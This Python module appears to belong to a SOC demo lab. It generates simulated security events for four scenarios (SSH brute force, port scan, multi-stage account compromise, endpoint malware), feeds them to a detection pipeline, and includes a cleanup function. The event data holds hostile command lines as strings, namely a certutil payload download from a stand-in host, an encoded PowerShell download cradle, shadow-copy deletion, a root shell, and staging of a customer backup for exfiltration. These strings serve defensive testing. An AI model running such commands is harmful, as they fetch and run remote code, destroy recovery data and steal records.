import uuid
from datetime import datetime, timezone, timedelta
from typing import Dict, Any, List
from sqlalchemy.orm import Session

from app.models.event import SecurityEvent
from app.models.incident import Incident, IncidentEvent
from app.models.response import ResponseAction, VerificationResult
from app.schemas.event import SecurityEventCreate
from app.services.ingestion_service import normalize_and_ingest_events
from app.agents.orchestrator import MultiAgentSOCEngine
from app.services.risk_service import calculate_incident_risk
from app.services.response_service import execute_response_action
from app.services.verification_service import create_and_run_verification

def run_scenario_1_brute_force(db: Session) -> Dict[str, Any]:
    """
    Scenario 1: Brute-force Authentication Attack
    Repeated SSH/RDP failed logins -> Detection -> Auth Agent -> Incident -> Response (Block IP) -> Verification.
    """
    attacker_ip = "185.220.101.45"
    target_user = "sarah.connor"
    now = datetime.now(timezone.utc)

    # 1. Ingest failed login events
    events_to_create = []
    for i in range(5):
        events_to_create.append(SecurityEventCreate(
            event_id=f"EVT-BF-{uuid.uuid4().hex[:6].upper()}",
            event_type="authentication",
            severity="HIGH" if i >= 3 else "MEDIUM",
            timestamp=now - timedelta(seconds=120 - (i * 20)),
            source_ip=attacker_ip,
            destination_ip="10.0.1.15",
            source_port=49152 + i,
            destination_port=22,
            protocol="SSH",
            username=target_user,
            host="AUTH-SRV-01",
            file_action="FAILED",
            command_line=f"sshd: Failed password for invalid user {target_user} from {attacker_ip} port {49152+i} ssh2",
            is_simulated=True,
            raw_payload=f"PAM-AUTH-FAIL: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={attacker_ip} user={target_user}"
        ))

    ingest_res, saved_events = normalize_and_ingest_events(db, events_to_create)

    # 2. Run Multi-Agent SOC pipeline
    engine = MultiAgentSOCEngine(db)
    orchestration_res = engine.run_pipeline(events=saved_events)

    # 3. Locate generated incident
    inc = db.query(Incident).filter(Incident.is_simulated == True).order_by(Incident.created_at.desc()).first()
    if inc:
        calculate_incident_risk(db, inc)

    return {
        "scenario": "Scenario 1: Brute-Force Authentication Attack",
        "attacker_ip": attacker_ip,
        "target_user": target_user,
        "events_generated": len(saved_events),
        "incident_id": inc.incident_id if inc else None,
        "orchestration": orchestration_res
    }

def run_scenario_2_network_scan(db: Session) -> Dict[str, Any]:
    """
    Scenario 2: Network Scanning & Port Sweep
    Reconnaissance sweep -> Detection -> Network Agent -> Attack Path -> Response -> Verification.
    """
    scanner_ip = "192.0.2.144"
    target_host = "WEB-PROD-01"
    now = datetime.now(timezone.utc)
    ports = [21, 22, 23, 25, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 8080]

    events_to_create = []
    for idx, p in enumerate(ports):
        events_to_create.append(SecurityEventCreate(
            event_id=f"EVT-SCAN-{uuid.uuid4().hex[:6].upper()}",
            event_type="network_connection",
            severity="MEDIUM" if idx < 5 else "HIGH",
            timestamp=now - timedelta(seconds=90 - (idx * 5)),
            source_ip=scanner_ip,
            destination_ip="10.0.1.50",
            source_port=52000 + idx,
            destination_port=p,
            protocol="TCP",
            host=target_host,
            file_action="SYN_SENT",
            command_line=f"TCP connection probe to {target_host}:{p} [SYN]",
            is_simulated=True,
            raw_payload=f"Suricata alert: Potential Nmap SYN scan detected from {scanner_ip} to port {p}"
        ))

    ingest_res, saved_events = normalize_and_ingest_events(db, events_to_create)
    engine = MultiAgentSOCEngine(db)
    orchestration_res = engine.run_pipeline(events=saved_events)

    inc = db.query(Incident).filter(Incident.is_simulated == True).order_by(Incident.created_at.desc()).first()
    if inc:
        calculate_incident_risk(db, inc)

    return {
        "scenario": "Scenario 2: Network Reconnaissance & Port Scanning",
        "scanner_ip": scanner_ip,
        "ports_probed": len(ports),
        "incident_id": inc.incident_id if inc else None,
        "orchestration": orchestration_res
    }

def run_scenario_3_account_compromise(db: Session) -> Dict[str, Any]:
    """
    Scenario 3: Multi-Stage Account Compromise
    Failed logins -> Success post-burst -> Privilege Escalation -> Sensitive file access.
    """
    attacker_ip = "198.51.100.23"  # Known C2 IP from CTI
    compromised_user = "vikram.sharma"
    target_host = "DB-FIN-01"
    now = datetime.now(timezone.utc)

    events_to_create = [
        # Stage 1: Failed Auth
        SecurityEventCreate(
            event_id=f"EVT-COMP-01-{uuid.uuid4().hex[:4].upper()}",
            event_type="authentication",
            severity="MEDIUM",
            timestamp=now - timedelta(minutes=6),
            source_ip=attacker_ip,
            destination_ip="10.0.1.20",
            protocol="HTTPS",
            username=compromised_user,
            host="VPN-GW-01",
            file_action="FAILED",
            command_line="Failed password attempt via VPN Portal",
            is_simulated=True
        ),
        # Stage 2: Success Post Burst
        SecurityEventCreate(
            event_id=f"EVT-COMP-02-{uuid.uuid4().hex[:4].upper()}",
            event_type="authentication",
            severity="CRITICAL",
            timestamp=now - timedelta(minutes=5),
            source_ip=attacker_ip,
            destination_ip="10.0.1.20",
            protocol="HTTPS",
            username=compromised_user,
            host="VPN-GW-01",
            file_action="SUCCESS_POST_BURST",
            command_line="Successful VPN session established from external IP post-failure burst",
            is_simulated=True
        ),
        # Stage 3: Privilege Escalation
        SecurityEventCreate(
            event_id=f"EVT-COMP-03-{uuid.uuid4().hex[:4].upper()}",
            event_type="privilege_escalation",
            severity="CRITICAL",
            timestamp=now - timedelta(minutes=4),
            source_ip=attacker_ip,
            username=compromised_user,
            host=target_host,
            command_line="sudo -u root bash -i (UID: 1004 elevated to UID: 0)",
            is_simulated=True,
            raw_payload="SUDOers audit: vikram.sharma : TTY=pts/2 ; PWD=/home/vikram ; USER=root ; COMMAND=/bin/bash"
        ),
        # Stage 4: Sensitive File Access
        SecurityEventCreate(
            event_id=f"EVT-COMP-04-{uuid.uuid4().hex[:4].upper()}",
            event_type="file_access",
            severity="HIGH",
            timestamp=now - timedelta(minutes=2),
            username=compromised_user,
            host=target_host,
            file_path="/var/backups/customers_backup.sql",
            file_action="READ_BULK",
            command_line="tar -czf /tmp/exfil.tar.gz /var/backups/customers_backup.sql",
            is_simulated=True
        )
    ]

    ingest_res, saved_events = normalize_and_ingest_events(db, events_to_create)
    engine = MultiAgentSOCEngine(db)
    orchestration_res = engine.run_pipeline(events=saved_events)

    inc = db.query(Incident).filter(Incident.is_simulated == True).order_by(Incident.created_at.desc()).first()
    if inc:
        calculate_incident_risk(db, inc)

    return {
        "scenario": "Scenario 3: Multi-Stage Account Compromise & Data Access",
        "compromised_user": compromised_user,
        "attacker_ip": attacker_ip,
        "incident_id": inc.incident_id if inc else None,
        "orchestration": orchestration_res
    }

def run_scenario_4_endpoint_malware(db: Session) -> Dict[str, Any]:
    """
    Scenario 4: Suspicious Endpoint Activity & Living-Off-The-Land Binary
    Certutil download -> Encoded PowerShell -> Vssadmin Shadow Copy Deletion.
    """
    host = "WS-DEV-108"
    user = "local_admin"
    now = datetime.now(timezone.utc)

    events_to_create = [
        SecurityEventCreate(
            event_id=f"EVT-MAL-01-{uuid.uuid4().hex[:4].upper()}",
            event_type="process_execution",
            severity="HIGH",
            timestamp=now - timedelta(minutes=3),
            host=host,
            username=user,
            process_name="certutil.exe",
            command_line="certutil.exe -urlcache -split -f https://update-service-cloud.xyz/payload.bin C:\\Windows\\Temp\\loader.exe",
            is_simulated=True
        ),
        SecurityEventCreate(
            event_id=f"EVT-MAL-02-{uuid.uuid4().hex[:4].upper()}",
            event_type="process_execution",
            severity="HIGH",
            timestamp=now - timedelta(minutes=2),
            host=host,
            username=user,
            process_name="powershell.exe",
            command_line="powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...",
            is_simulated=True
        ),
        SecurityEventCreate(
            event_id=f"EVT-MAL-03-{uuid.uuid4().hex[:4].upper()}",
            event_type="process_execution",
            severity="CRITICAL",
            timestamp=now - timedelta(minutes=1),
            host=host,
            username=user,
            process_name="vssadmin.exe",
            command_line="vssadmin.exe delete shadows /all /quiet",
            is_simulated=True,
            file_action="INHIBIT_SYSTEM_RECOVERY"
        )
    ]

    ingest_res, saved_events = normalize_and_ingest_events(db, events_to_create)
    engine = MultiAgentSOCEngine(db)
    orchestration_res = engine.run_pipeline(events=saved_events)

    inc = db.query(Incident).filter(Incident.is_simulated == True).order_by(Incident.created_at.desc()).first()
    if inc:
        calculate_incident_risk(db, inc)

    return {
        "scenario": "Scenario 4: Endpoint Activity & Shadow Copy Deletion",
        "affected_host": host,
        "incident_id": inc.incident_id if inc else None,
        "orchestration": orchestration_res
    }

def reset_demo_lab(db: Session) -> Dict[str, Any]:
    """
    Cleans up all simulated demo data while preserving real detection rules,
    users, and threat indicators.
    """
    # Delete response actions and verifications for simulated incidents
    sim_incidents = db.query(Incident).filter(Incident.is_simulated == True).all()
    inc_ids = [i.incident_id for i in sim_incidents]

    db.query(VerificationResult).filter(VerificationResult.incident_id.in_(inc_ids)).delete(synchronize_session=False)
    db.query(ResponseAction).filter(ResponseAction.incident_id.in_(inc_ids)).delete(synchronize_session=False)
    db.query(IncidentEvent).filter(IncidentEvent.incident_id.in_(inc_ids)).delete(synchronize_session=False)
    db.query(Incident).filter(Incident.is_simulated == True).delete(synchronize_session=False)
    
    # Delete simulated events
    deleted_events = db.query(SecurityEvent).filter(SecurityEvent.is_simulated == True).delete(synchronize_session=False)
    db.commit()

    return {
        "status": "RESET_SUCCESSFUL",
        "simulated_incidents_cleared": len(inc_ids),
        "simulated_events_cleared": deleted_events
    }
